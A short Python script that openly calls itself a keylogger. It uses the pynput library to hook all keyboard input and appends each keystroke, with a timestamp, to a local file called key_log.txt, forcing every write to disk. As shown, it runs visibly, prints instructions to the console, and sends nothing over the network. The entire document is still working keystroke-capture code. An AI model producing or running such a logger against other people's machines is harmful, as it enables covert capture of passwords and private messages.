import pynput.keyboard
from datetime import datetime
import time
import os

log_file = "key_log.txt"

# Reset the file on start
with open(log_file, "w") as f:
    f.write("--- Keylogger Started ---\n")

def process_keys(key):
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        k = ""

        if hasattr(key, 'char') and key.char is not None:
            k = key.char
        elif key == pynput.keyboard.Key.space:
            k = " "
        elif key == pynput.keyboard.Key.enter:
            k = "[ENTER]"
        elif key == pynput.keyboard.Key.backspace:
            k = "[BACKSPACE]"
        
        if k:
            # Open the file, write, and FORCE a save to disk
            with open(log_file, "a") as f:
                f.write(f"{timestamp} --> \"{k}\"\n")
                f.flush() # Force Python to empty the buffer
                os.fsync(f.fileno()) # Force the Operating System to write to disk
            
    except Exception as e:
        print(f"Error: {e}")

# Start the listener
listener = pynput.keyboard.Listener(on_press=process_keys)
listener.start()

print("RUNNING: Type some letters, then open 'key_log.txt' to check.")
print("Press Ctrl+C to stop.")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nStopping...")
    listener.stop()